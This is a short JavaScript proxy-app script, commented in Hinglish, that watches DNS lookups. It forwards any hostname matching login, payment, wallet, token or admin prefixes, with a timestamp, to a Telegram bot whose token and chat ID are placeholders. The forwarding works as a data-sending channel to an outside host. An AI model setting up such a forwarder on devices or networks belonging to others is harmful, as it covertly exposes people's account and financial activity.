// ══════════════════════════════════════
// dns_logger.js - AXE DNS Query Logger
// Har DNS query Telegram pe log karo
// ══════════════════════════════════════

const TELEGRAM_TOKEN = "APNA_TOKEN_DAAL";
const CHAT_ID = "APNA_CHAT_ID_DAAL";

// DNS queries batch karo (spam mat karo)
const hostname = $domain || "unknown";

// Sensitive domains check
const sensitiveDomains = [
  "api.", "auth.", "login.", "account.", "pay.", "payment.",
  "wallet.", "token.", "secure.", "admin.", "internal."
];

let isSensitive = false;
for (const d of sensitiveDomains) {
  if (hostname.startsWith(d) || hostname.includes(d)) {
    isSensitive = true;
    break;
  }
}

// Sirf sensitive domains log karo (spam avoid)
if (isSensitive) {
  const msg = "🔍 DNS: " + hostname + "\n⏰ " + new Date().toISOString();

  $httpClient.post({
    url: "https://api.telegram.org/bot" + TELEGRAM_TOKEN + "/sendMessage",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: msg
    })
  }, function(err, resp, data) {
    $done({});
  });
} else {
  $done({});
}
